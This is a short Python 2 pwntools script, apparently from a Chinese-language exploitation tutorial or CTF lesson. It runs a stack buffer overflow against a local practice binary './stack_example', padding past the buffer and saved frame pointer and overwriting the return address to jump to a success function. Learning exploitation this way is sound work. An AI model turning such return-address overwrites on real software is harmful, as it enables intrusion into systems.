##coding=utf8
from pwn import *
## 构造与程序交互的对象
sh = process('./stack_example')
success_addr = 0x08048456
## 构造payload
payload = 'a' * 0x14 + 'aaaa' + p32(success_addr)
print p32(success_addr)
## 向程序发送字符串
sh.sendline(payload)
## 将代码交互转换为手工交互
sh.interactive()